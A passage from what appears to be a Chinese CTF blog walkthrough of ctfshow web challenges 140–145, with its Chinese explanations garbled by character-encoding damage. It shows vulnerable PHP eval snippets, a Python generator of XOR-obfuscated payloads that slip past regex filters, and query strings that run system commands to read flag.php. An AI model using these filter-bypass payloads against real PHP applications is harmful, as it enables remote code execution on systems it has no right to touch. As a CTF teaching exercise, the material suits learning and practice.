alt=""><br>ÂèØ‰ª•ÁúãÂà∞0ÂíåÂ≠óÁ¨¶‰∏≤ËøõË°åÂº±ÊØîËæÉÁöÑÊó∂ÂÄôËøîÂõûÁöÑÊòØtrueÔºåÂõ†‰∏∫<code>==</code>Âú®ËøõË°åÊØîËæÉÁöÑÊó∂ÂÄôÔºå‰ºöÂÖàÂ∞ÜÂ≠óÁ¨¶‰∏≤Á±ªÂûãËΩ¨ÂåñÊàêÁõ∏ÂêåÔºåÂÜçÊØîËæÉÔºåËÄåctfshowÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂíå0Áõ∏ÊØîËæÉÁöÑÊó∂ÂÄôË¶ÅËΩ¨Êç¢ÊàêÊï∞Â≠óÔºåctfshowËΩ¨Êç¢ÊàêÊï∞Â≠óÁöÑÊó∂ÂÄôÊòØ0ÔºåÊâÄ‰ª•Áõ∏Á≠âËøîÂõûtrue<br>ËÄåintval()ÂáΩÊï∞‰ºöÂ∞ÜÈùûÊï∞Â≠óÊàñÈùûÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫0Ôºå‰πüÂ∞±ÊòØÊàë‰ª¨‰º†ÂÖ•ÁöÑf1Âíåf2‰∫íÁõ∏ÊûÑÈÄ†Âç≥ÂèØÔºåÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†‰∏Ä‰∏™md5ÔºåËøôÊ†∑intvalÂ∞±‰ºöËøîÂõû0<br>ÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postÔºö</span><br><span class="line">f1&#x3D;md5&amp;f2&#x3D;md5</span><br></pre></td></tr></table></figure><p>Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web141"><a class="header-anchor" href="#web141">¬∂</a>web141</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v3))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ÂàÜÊûêÊ∫ê‰ª£Á†ÅÔºåËøôÈáåÁî®‰∫ÜÊ≠£ÂàôË°®ËææÂºè<code>/^\W+$/</code>ÔºåÊääÊï∞Â≠óÂíåÂ≠óÊØçËøòÊúâ‰∏ãÂàíÁ∫øÁªôban‰∫ÜÔºå‰πãÂâçÊó†Â≠óÊØçÊï∞Â≠óÁöÑwebshellÊàë‰ª¨Áî®‰∫ÜÊàñËøêÁÆóÔºåËøôÊ¨°Áî®ÂºÇÊàñÊù•ÂêßÔºàÊàñËøêÁÆóÔºåÂºÇÊàñÔºåÂèñÂèçÁ≠âÁ≠âÈÉΩÂèØ‰ª•ÔºâÔºåpythonËÑöÊú¨Â¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÁîüÊàêÂèØÁî®ÁöÑÂ≠óÁ¨¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[a-zA-Z0-9]&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ê†πÊçÆËæìÂÖ•ÁöÑÂëΩ‰ª§Âú®ÁîüÊàêÁöÑtxt‰∏≠ËøõË°åÂåπÈÖç</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionÔºö&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandÔºö&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/GX%7BS4BP5%24%60LJP~5W%7B%25RQDY0.png" alt=""><br>ÁÑ∂Âêév1Âíåv2Â∞±ÈöèÊÑèÂ°´Ôºåv3Â°´ÊûÑÈÄ†Âá∫ÁöÑpaylaodÂç≥ÂèØÔºå‰ΩÜÊ≥®ÊÑèÁöÑÊòØËøôÈáåÊúâ‰∏™returnÂπ≤Êâ∞ÔºåÊâÄ‰ª•Êàë‰ª¨Ë¶ÅÂú®v3ÁöÑpayloadÂâçËæπÂíåÂêéÈù¢Âä†‰∏ä‰∏Ä‰∫õÂ≠óÁ¨¶Â∞±ÂèØ‰ª•ÊâßË°åÂëΩ‰ª§Ôºå‰æãÂ¶Ç<code>\+ - *</code> Á≠âÁ≠â<br>Êü•ÁúãÂΩìÂâçÁõÆÂΩï‰∏ãÊñá‰ª∂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/%60%60%25%5DZ54%60~O2KZ%282%5BPAEV82W.png" alt=""><br>ÁúãÂà∞flag.phpÔºåÂÜçÁîüÊàê‰∏ÄÊ¨°payload<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/6_%5B%7BLHJB8QLF7J%2555H4GTYC.png" alt=""><br>Ëé∑Âèñflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/X2%28X%7B%5DSL%5B~ONE~%29%7D%2845B0%28X.png" alt=""></p><h3 id="web142"><a class="header-anchor" href="#web142">¬∂</a>web142</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1))&#123;</span><br><span class="line">        $d = (<span class="keyword">int</span>)($v1 * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep($d);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>is_numeric()</code>ÂáΩÊï∞ÂåπÈÖç‰∏∫Êï∞Â≠óÊàñËÄÖÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÁöÑËØù‰ºöËøîÂõûtrueÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË¶ÅËæìÂÖ•Êï∞Â≠óÂ∞±ÂèØ‰ª•Ôºå‰ΩÜ‰∏ãÈù¢Êúâ‰∏™sleep‰ºëÁú†ÔºåÊâÄ‰ª•ÈúÄË¶Å‰º†0ÔºåÂê¶ÂàôÁ≠âÂà∞Â§©ËçíÂú∞ËÄÅ‚Ä¶<br>payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;0</span><br></pre></td></tr></table></figure><h3 id="web143"><a class="header-anchor" href="#web143">¬∂</a>web143</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Âú®web141ÁöÑÂü∫Á°Ä‰∏äÂ§öbanÊéâ‰∏Ä‰∫õÂ≠óÁ¨¶Ôºåban‰∫ÜÂèñÂèçÔºå‰ΩÜÊ≤°banÂºÇÊàñÈúÄË¶ÅÁöÑ<code>^</code>ÔºåÊâÄ‰ª•ËøòÊòØÂèØ‰ª•Áî®web141ÁöÑËÑöÊú¨Ôºå‰∏çËøáÈúÄË¶ÅÊîπ‰∏Ä‰∏ãËßÑÂàô</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÁîüÊàêÂèØÁî®ÁöÑÂ≠óÁ¨¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ê†πÊçÆËæìÂÖ•ÁöÑÂëΩ‰ª§Âú®ÁîüÊàêÁöÑtxt‰∏≠ËøõË°åÂåπÈÖç</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionÔºö&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandÔºö&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web143/%2575A4LJ6O_8TTQ_H%60RJU%25PI.png" alt=""><br>ËÆ∞‰ΩèÔºåv3ËøôÈáåÈúÄË¶ÅÂâçÂêéÂä†‰∏äÁ¨¶Âè∑ÊãúÊâòÊéâreturnÔºåÊúÄÁªàpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*</span><br></pre></td></tr></table></figure><h3 id="web144"><a class="header-anchor" href="#web144">¬∂</a>web144</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v2))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen($str)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Âíåweb141‰∏ÄÊ†∑ÔºåËøôÊòØÂèÇÊï∞ÈúÄË¶ÅÊîπ‰∏Ä‰∏ãÔºåÂõ†‰∏∫ËøôÈáåÊúâ‰∏™checkÂáΩÊï∞ÂØπv3ÂÅöÊ£ÄÊµãÔºåÊàë‰ª¨ÊääpayloadÊîπÂà∞v2Âç≥ÂèØÔºåËøêË°åweb141ÁöÑËÑöÊú¨Â∞±Ë°å<br>payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure><h3 id="web145"><a class="header-anchor" href="#web145">¬∂</a>web145</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Âú®ÂâçÈù¢Âü∫Á°Ä‰∏äban‰∫ÜÂºÇÊàñÔºå‰ΩÜÊîæË°å‰∫Ü<code>~</code>ÂèñÂèçËøêÁÆóÁ¨¶Ôºå‰ΩÜ‰πãÂâçv3ÈúÄË¶Å<code>* ; + -</code> 